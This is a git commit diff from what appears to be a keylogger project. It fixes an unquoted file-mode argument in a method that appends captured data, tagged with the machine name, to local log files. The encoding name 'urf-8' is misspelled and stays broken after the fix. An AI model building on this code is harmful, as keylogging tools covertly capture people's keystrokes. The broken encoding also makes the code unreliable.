e9927bfac0168201431f26366e382256a915555d
david <davidrechdiner@gmail.com>
2025-08-27 14:59:15 +0300

    ok

--- keylogger-agent/services/file_writer.py
+++ keylogger-agent/services/file_writer.py
@@ -10,7 +10,7 @@ class FileWriter(IWriter):
     def send_data(self, data:str, machine_name:str):
         file_name = self._generate_filename()
         full_path = os.path.join(self.file_path, file_name)
-        with open(full_path, a, encoding="urf-8") as f:
+        with open(full_path, "a", encoding="urf-8") as f:
             f.write(f"[{machine_name}] {data}\n")
 
     def _ensure_directory_exists(self, path:str):
